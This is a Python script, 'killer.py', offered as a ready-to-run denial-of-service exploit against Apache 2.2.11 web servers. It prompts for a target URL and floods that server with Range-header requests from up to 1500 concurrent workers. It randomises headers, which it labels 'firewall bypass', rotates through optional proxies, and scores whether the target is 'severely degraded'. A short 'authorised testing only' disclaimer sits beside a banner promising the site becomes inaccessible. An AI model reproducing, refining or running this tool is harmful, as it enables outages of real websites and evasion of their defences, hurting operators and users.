#!/usr/bin/env python3
# killer.py - Apache 2.2.11 DoS Exploit (CVE-2009-1891)
# 
# Installation:
#   pip install aiohttp colorama
#
# Usage:
#   python killer.py
#
# ⚠️  FOR AUTHORIZED STRESS TESTING ONLY ⚠️
# This tool is designed to test the resilience of Apache 2.2.11 servers.
# It will cause service disruption; stop the script to allow recovery.
#
# Copyright (c) 2025 Avesta Hasanzadeh
# Telegram: @AvestaHacksDB
# Website: avesta-cyber-team.lovable.app
# ============================================================================

import asyncio
import aiohttp
import time
import random
import hashlib
import json
from colorama import Fore, init, Style
from typing import Dict, Optional, List, Tuple
from datetime import datetime
from urllib.parse import urlparse, quote

init(autoreset=True)

# =============================================================================
# CONFIGURATION – TUNE CAREFULLY
# =============================================================================
# Target URL will be asked interactively

# Adaptive parameters
INITIAL_WORKERS = 40                # start with fewer workers
MAX_WORKERS = 1500                  # lower ceiling
REQUESTS_PER_WORKER_BASE = 15       # lower initial requests
REQUESTS_PER_WORKER_MAX = 700       # maximum requests per worker
RAMP_UP_TIME = 1800                 # seconds to reach max aggression
TIMEOUT = 15
RETRY_DELAY = 0.001

# Firewall bypass
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
]
ACCEPT_LANGUAGES = ["en-US,en;q=0.9", "fr-FR,fr;q=0.8", "de-DE,de;q=0.7"]

# Attack vectors – each is a dict with method, headers generator, etc.
ATTACK_VECTORS = [
    {"name": "range_overlap", "method": "GET", "gen_range": True},
    {"name": "range_fragment", "method": "GET", "gen_range": True, "fragment": True},
    {"name": "if_range", "method": "GET", "if_range": True},
    {"name": "head", "method": "HEAD"},
]

# Proxy list (optional) – set to [] to disable
PROXY_LIST = []   # e.g., ["http://user:pass@proxy1:port", "socks5://proxy2:port"]

# =============================================================================
# 🔥 TARGET PATHS - ONLY CONFIRMED WORKING ON APACHE 2.2.11 DEFAULT INSTALL 🔥
# =============================================================================
TARGET_PATHS = [
    "/",
    "/index.html",
    "/icons/apache_pb.gif",
    "/icons/blank.gif",
    "/icons/folder.gif",
    "/icons/back.gif",
    "/icons/ball.gif",
]

# =============================================================================
# SMART PRINTER
# =============================================================================
class SmartPrinter:
    def __init__(self, label: str):
        self.label = label
        self.last_stats_time = 0
        self.stats_interval = 2.0
        self.buffer = []

    def _color_status(self, status: int) -> str:
        if status == 206:
            return Fore.GREEN + "206 Partial"
        elif status == 416:
            return Fore.YELLOW + "416 Range"
        elif status == 200:
            return Fore.BLUE + "200 OK"
        elif status == 404:
            return Fore.MAGENTA + "404 Not Found"
        elif status in (500, 502, 503, 504):
            return Fore.RED + f"{status} Error"
        elif status == 403:
            return Fore.RED + "403 Forbidden"
        elif status == 408:
            return Fore.RED + "408 Timeout"
        else:
            return Fore.WHITE + str(status)

    def _color_method(self, method: str) -> str:
        colors = {'GET': Fore.CYAN, 'HEAD': Fore.YELLOW, 'RANGE': Fore.GREEN}
        return colors.get(method, Fore.WHITE) + method

    def _format_size(self, size: int) -> str:
        if size < 1024:
            return f"{size}B"
        elif size < 1024*1024:
            return f"{size/1024:.1f}KB"
        else:
            return f"{size/(1024*1024):.1f}MB"

    def print_request(self, req_id: int, status: int, method: str,
                     size: int, path: str, elapsed: float,
                     worker_id: int = None, file_size: int = 0,
                     vector: str = ""):
        timestamp = datetime.now().strftime("%H:%M:%S")
        status_str = self._color_status(status)
        method_str = self._color_method(method)
        size_str = Fore.CYAN + self._format_size(size)
        file_size_str = Fore.CYAN + self._format_size(file_size) if file_size > 0 else ""
        time_str = f"{elapsed*1000:.0f}ms" if elapsed > 0 else ""
        worker_str = f"W{worker_id:03d}" if worker_id else ""
        vector_str = Fore.MAGENTA + vector[:8] if vector else ""

        line = (f"{timestamp} [{req_id:06d}] {method_str} {status_str} "
                f"{path[:35]:<35} {size_str:<8} {time_str:<6} {worker_str} {vector_str}")
        print(line, flush=True)

    def print_stats(self, stats: Dict, total_workers: int, req_per_worker: int,
                    health: str = "OK"):
        total = stats['total']
        success = stats['success']
        failed = stats['failed']
        timeout = stats['timeout']
        rate = (success / max(1, total)) * 100
        line = (f"{Fore.MAGENTA}📊 {self.label} | Workers:{Fore.YELLOW}{total_workers:>4} "
                f"Req/W:{Fore.CYAN}{req_per_worker:>3} | Total:{Fore.WHITE}{total:>6} "
                f"✅{Fore.GREEN}{success:>5} ❌{Fore.RED}{failed:>5} ⏰{Fore.RED}{timeout:>4} "
                f"🎯{Fore.CYAN}{rate:>5.1f}% | Health:{Fore.GREEN if health=='OK' else Fore.RED}{health}")
        print(line, flush=True)

    def print_final_report(self, stats: Dict, total_workers: int,
                           elapsed: float, health_history: List[str]):
        total = stats['total']
        success = stats['success']
        failed = stats['failed']
        timeout = stats['timeout']
        errors = stats['errors']
        bytes_mb = stats.get('total_bytes', 0) / (1024*1024)
        rate = (success / max(1, total)) * 100
        req_sec = total / max(1, elapsed)

        print("\n" + Fore.RED + "="*80)
        print(Fore.RED + f"   💀 FINAL REPORT – {self.label} 💀")
        print(Fore.RED + "="*80)
        print(Fore.YELLOW + "\n📊 STATISTICS:")
        print(f"  Total Requests:     {total:,}")
        print(f"  ✅ Successful:      {success:,} ({rate:.1f}%)")
        print(f"  ❌ Failed:          {failed:,}")
        print(f"  ⏰ Timeouts:        {timeout:,}")
        print(f"  💥 Errors:          {errors:,}")
        print(Fore.CYAN + f"\n📈 PERFORMANCE:")
        print(f"  Total Data:         {bytes_mb:.2f} MB")
        print(f"  Elapsed:            {elapsed:.2f}s")
        print(f"  Requests/sec:       {req_sec:.2f}")
        print(f"  Data Rate:          {bytes_mb / max(1, elapsed):.2f} MB/s")
        print(Fore.MAGENTA + f"\n🏥 SERVER HEALTH:")
        recent = health_history[-30:] if health_history else []
        if recent:
            ok_ratio = recent.count("OK") / len(recent)
            if ok_ratio > 0.7:
                print(Fore.GREEN + "  ✅ TARGET STILL RESPONSIVE – attack may need more time")
            elif ok_ratio > 0.3:
                print(Fore.YELLOW + "  ⚠️ TARGET SHOWING SIGNS OF STRESS")
            else:
                print(Fore.RED + "  🔥 TARGET SEVERELY DEGRADED – attack successful")
        else:
            print("  No health data collected.")
        print(Fore.RED + "="*80)

# =============================================================================
# CORE ATTACK ENGINE
# =============================================================================
class SmartBouldozer:
    def __init__(self, target: str, label: str = "🔥"):
        self.target = target.rstrip('/')
        self.label = label
        self.session = None
        self.connector = None
        self.request_counter = 0
        self.printer = SmartPrinter(label)
        self.stats = {
            "total": 0,
            "success": 0,
            "failed": 0,
            "timeout": 0,
            "errors": 0,
            "total_bytes": 0,
            "start_time": None,
            "end_time": None,
        }
        self.active_tasks = set()
        self.semaphore = None
        self.file_sizes = {}
        self.health_history = []
        self.attack_active = True
        self.current_workers = INITIAL_WORKERS
        self.current_req_per_worker = REQUESTS_PER_WORKER_BASE
        self.base_status_codes = {}
        self.proxy_pool = PROXY_LIST
        self.proxy_index = 0

    async def create_session(self):
        connector_kwargs = {
            "limit": MAX_WORKERS * 2,
            "limit_per_host": MAX_WORKERS,
            "ttl_dns_cache": 60,
            "enable_cleanup_closed": True,
            "ssl": False,
            "force_close": True,
        }
        self.connector = aiohttp.TCPConnector(**connector_kwargs)
        timeout = aiohttp.ClientTimeout(total=TIMEOUT, connect=3, sock_read=TIMEOUT)
        self.session = aiohttp.ClientSession(
            connector=self.connector,
            timeout=timeout,
            headers={
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
            }
        )
        self.semaphore = asyncio.Semaphore(MAX_WORKERS * 2)

    def _get_next_proxy(self) -> Optional[str]:
        if not self.proxy_pool:
            return None
        proxy = self.proxy_pool[self.proxy_index % len(self.proxy_pool)]
        self.proxy_index += 1
        return proxy

    def _random_headers(self, path: str) -> Dict:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(ACCEPT_LANGUAGES),
            'Accept-Encoding': 'gzip, deflate',
            'Referer': random.choice(REFERERS),
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'DNT': '1',
        }
        return headers

    async def get_file_size(self, path: str) -> int:
        if path in self.file_sizes:
            return self.file_sizes[path]
        try:
            async with self.session.head(f"{self.target}{path}") as resp:
                size = int(resp.headers.get('Content-Length', 0))
                self.file_sizes[path] = size
                return size
        except:
            self.file_sizes[path] = 0
            return 0

    def _build_range_headers(self, file_size: int, fragment: bool = False) -> Dict:
        """Generate byte-range headers safely - FIXED for small files"""
        if file_size <= 0:
            return {}
        if file_size < 1024:
            return {}
        if fragment:
            ranges = []
            for _ in range(random.randint(2, 4)):
                max_start = max(0, file_size - 100)
                if max_start <= 0:
                    return {}
                start = random.randint(0, min(max_start, file_size - 10))
                end = min(start + random.randint(100, min(5000, file_size - start - 1)), file_size - 1)
                if end > start:
                    ranges.append(f"{start}-{end}")
            if file_size > 100:
                ranges.append(f"-{random.randint(10, min(1000, file_size - 1))}")
            if ranges:
                return {'Range': f"bytes={','.join(ranges)}"}
            return {}
        else:
            if file_size < 100:
                return {}
            max_start = max(0, file_size - 100)
            start = random.randint(0, min(max_start, file_size - 10))
            max_end = file_size - 1
            min_end = min(start + 100, max_end)
            if min_end > max_end:
                return {}
            end = random.randint(min_end, max_end)
            if end <= start:
                return {}
            return {'Range': f"bytes={start}-{end}"}

    async def send_request(self, req_id: int, worker_id: int):
        """Single request with adaptive vector selection and proxy rotation."""
        async with self.semaphore:
            start_time = time.time()

            path = random.choice(TARGET_PATHS)
            if '?' in path:
                full_path = path + f"&_={random.randint(1,999999)}"
            else:
                full_path = path + f"?_={random.randint(1,999999)}"
            url = f"{self.target}{full_path}"

            vector = random.choice(ATTACK_VECTORS)
            method = vector.get('method', 'GET')
            headers = self._random_headers(path)

            file_size = 0
            if vector.get('gen_range', False):
                file_size = await self.get_file_size(path)
                range_headers = self._build_range_headers(
                    file_size,
                    fragment=vector.get('fragment', False)
                )
                if range_headers:
                    headers.update(range_headers)
                else:
                    method = 'GET'
                    vector = {'name': 'normal_get', 'method': 'GET'}

            proxy = self._get_next_proxy() if self.proxy_pool else None

            for attempt in range(2):
                try:
                    async with self.session.request(
                        method=method,
                        url=url,
                        headers=headers,
                        proxy=proxy,
                        allow_redirects=False,
                    ) as resp:
                        elapsed = time.time() - start_time
                        data = b''
                        if method != 'HEAD':
                            data = await resp.content.read()
                        size = len(data)
                        self.stats["total"] += 1
                        self.stats["total_bytes"] += size

                        status = resp.status
                        if status in (200, 206, 416):
                            self.stats["success"] += 1
                        else:
                            self.stats["failed"] += 1

                        vector_name = vector.get('name', '')
                        self.printer.print_request(
                            req_id=req_id,
                            status=status,
                            method=method,
                            size=size,
                            path=path[:35],
                            elapsed=elapsed,
                            worker_id=worker_id,
                            file_size=file_size,
                            vector=vector_name
                        )
                        return
                except asyncio.TimeoutError:
                    if attempt == 0:
                        await asyncio.sleep(RETRY_DELAY)
                        continue
                    self.stats["total"] += 1
                    self.stats["timeout"] += 1
                    self.printer.print_request(
                        req_id=req_id,
                        status=408,
                        method=method,
                        size=0,
                        path=path[:35] + " ⏰",
                        elapsed=TIMEOUT,
                        worker_id=worker_id,
                        file_size=file_size,
                        vector=vector.get('name', '')
                    )
                    return
                except Exception as e:
                    if attempt == 0:
                        await asyncio.sleep(RETRY_DELAY)
                        continue
                    self.stats["total"] += 1
                    self.stats["errors"] += 1
                    self.printer.print_request(
                        req_id=req_id,
                        status=500,
                        method=method,
                        size=0,
                        path=path[:35] + " 💥",
                        elapsed=time.time() - start_time,
                        worker_id=worker_id,
                        file_size=file_size,
                        vector=vector.get('name', '')
                    )
                    return

    async def health_check(self) -> bool:
        """Perform a quick health check to establish baseline response codes."""
        print(Fore.YELLOW + "\n🔍 Performing health check...")
        healthy_codes = {}
        for path in TARGET_PATHS[:5]:
            try:
                async with self.session.get(f"{self.target}{path}") as resp:
                    healthy_codes[path] = resp.status
                    print(Fore.CYAN + f"  {path} → {resp.status}")
            except Exception as e:
                healthy_codes[path] = None
                print(Fore.RED + f"  {path} → ERROR: {str(e)[:50]}")
        self.base_status_codes = healthy_codes
        ok = all(c == 200 for c in healthy_codes.values() if c is not None)
        if ok:
            print(Fore.GREEN + "✅ Target seems healthy (baseline 200 OK).")
        else:
            print(Fore.YELLOW + f"⚠️ Baseline statuses: {healthy_codes} – proceeding anyway.")
        return True

    async def worker(self, worker_id: int, req_count: int):
        """Worker coroutine that adapts its pace based on server health."""
        for i in range(req_count):
            if not self.attack_active:
                break
            self.request_counter += 1
            await self.send_request(self.request_counter, worker_id)

            if self.health_history and self.health_history[-1] != "OK":
                await asyncio.sleep(random.uniform(0.5, 1.5))
            else:
                await asyncio.sleep(random.uniform(0.05, 0.2))

            if i % 20 == 0:
                stats_for_print = self.stats.copy()
                stats_for_print['total'] = self.request_counter
                health = self.health_history[-1] if self.health_history else "UNKNOWN"
                self.printer.print_stats(
                    stats_for_print,
                    self.current_workers,
                    self.current_req_per_worker,
                    health=health
                )

    async def adjust_rate(self):
        """Periodically adjust workers and requests based on server responses."""
        while self.attack_active:
            await asyncio.sleep(5)

            if not hasattr(self, '_prev_total'):
                self._prev_total = 0
                self._prev_success = 0
            delta_total = self.stats['total'] - self._prev_total
            delta_success = self.stats['success'] - self._prev_success
            if delta_total > 0:
                error_rate = 1 - (delta_success / delta_total)
            else:
                error_rate = 0
            self._prev_total = self.stats['total']
            self._prev_success = self.stats['success']

            if error_rate < 0.2:
                health = "OK"
            elif error_rate < 0.5:
                health = "STRESSED"
            else:
                health = "DEGRADED"
            self.health_history.append(health)

            progress = min(1.0, (time.time() - self.stats['start_time']) / RAMP_UP_TIME)
            target_workers = int(INITIAL_WORKERS + (MAX_WORKERS - INITIAL_WORKERS) * progress)
            target_req_per_worker = int(REQUESTS_PER_WORKER_BASE +
                                        (REQUESTS_PER_WORKER_MAX - REQUESTS_PER_WORKER_BASE) * progress)

            if health == "DEGRADED":
                target_workers = max(INITIAL_WORKERS, int(target_workers * 0.5))
                target_req_per_worker = max(REQUESTS_PER_WORKER_BASE, int(target_req_per_worker * 0.7))
            elif health == "STRESSED":
                target_workers = int(target_workers * 0.8)
                target_req_per_worker = int(target_req_per_worker * 0.9)

            self.current_workers = target_workers
            self.current_req_per_worker = target_req_per_worker

    async def run_attack(self):
        """Main attack loop with adaptive ramp-up."""
        print(Fore.RED + "="*80)
        print(Fore.RED + f"   💀 {self.label} – SMART BOOLDOZER v2.0 💀")
        print(Fore.RED + "="*80)
        print(Fore.YELLOW + f"📡 Target: {self.target}")
        print(Fore.CYAN + "🔥 Adaptive, firewall‑bypass, low false‑positive\n")

        self.stats["start_time"] = time.time()
        await self.create_session()
        await self.health_check()

        adjuster_task = asyncio.create_task(self.adjust_rate())

        print(Fore.CYAN + "⏱️ TIME  | ID     | METHOD | STATUS       | PATH                                | SIZE    | TIME  | WORKER | VECTOR")
        print(Fore.CYAN + "-" * 90)

        start_time = time.time()
        elapsed = 0
        total_workers = 0
        while elapsed < RAMP_UP_TIME and self.attack_active:
            new_workers = max(1, int(self.current_workers - total_workers))
            if new_workers > 0:
                for _ in range(min(new_workers, MAX_WORKERS - total_workers)):
                    total_workers += 1
                    task = asyncio.create_task(
                        self.worker(total_workers, self.current_req_per_worker)
                    )
                    self.active_tasks.add(task)
                    task.add_done_callback(self.active_tasks.discard)

            await asyncio.sleep(1)
            elapsed = time.time() - start_time

        print(Fore.YELLOW + f"\n⏳ Ramp-up complete. Waiting for {len(self.active_tasks)} workers to finish...")
        if self.active_tasks:
            await asyncio.gather(*self.active_tasks, return_exceptions=True)

        self.attack_active = False
        adjuster_task.cancel()

        self.stats["end_time"] = time.time()
        await self.session.close()

        elapsed_total = self.stats["end_time"] - self.stats["start_time"]
        self.printer.print_final_report(
            self.stats,
            total_workers,
            elapsed_total,
            self.health_history
        )

# =============================================================================
# MAIN
# =============================================================================
async def main():
    banner = r"""
    ╔════════════════════════════════════════════════════════════════════╗
    ║  💀  CVE‑2009‑1891  –  SMART BOOLDOZER v2.0 (killer.py)        ║
    ║  🔥  Apache 2.2.11 DoS Exploit – Stress Testing Tool            ║
    ║                                                                  ║
    ║  Copyright (c) 2025 Avesta Hasanzadeh                           ║
    ║  Telegram: @AvestaHacksDB                                       ║
    ║  Website: avesta-cyber-team.lovable.app                         ║
    ║                                                                  ║
    ║  ⚠️  LEGAL WARNING:                                             ║
    ║  This tool is intended solely for authorised security testing   ║
    ║  and vulnerability assessment on systems you own or have       ║
    ║  explicit permission to test. Unauthorised use is illegal.     ║
    ║                                                                  ║
    ║  ⚡ EFFECT: As soon as the script runs, the target website     ║
    ║  will become inaccessible after a few moments. Stopping the    ║
    ║  script (Ctrl+C) will allow the server to recover.             ║
    ║                                                                  ║
    ║  📌 TARGET: Must be Apache 2.2.11 (or similar vulnerable)     ║
    ║  The attack relies on the Range header vulnerability.           ║
    ╚════════════════════════════════════════════════════════════════════╝
    """
    print(Fore.RED + banner)

    target = input(Fore.YELLOW + "Enter target URL (e.g., http://example.com): ").strip()
    if not target:
        print(Fore.RED + "No target provided. Exiting.")
        return

    attacker = SmartBouldozer(target, "SMART🔥")
    try:
        await attacker.run_attack()
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[!] Attack interrupted by user.")
        attacker.attack_active = False
        for task in attacker.active_tasks:
            task.cancel()
        await asyncio.gather(*attacker.active_tasks, return_exceptions=True)
        if attacker.stats['start_time']:
            attacker.stats['end_time'] = time.time()
            elapsed = attacker.stats['end_time'] - attacker.stats['start_time']
            attacker.printer.print_final_report(
                attacker.stats,
                attacker.current_workers,
                elapsed,
                attacker.health_history
            )
    except Exception as e:
        print(Fore.RED + f"\n[!] Fatal error: {e}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Goodbye!")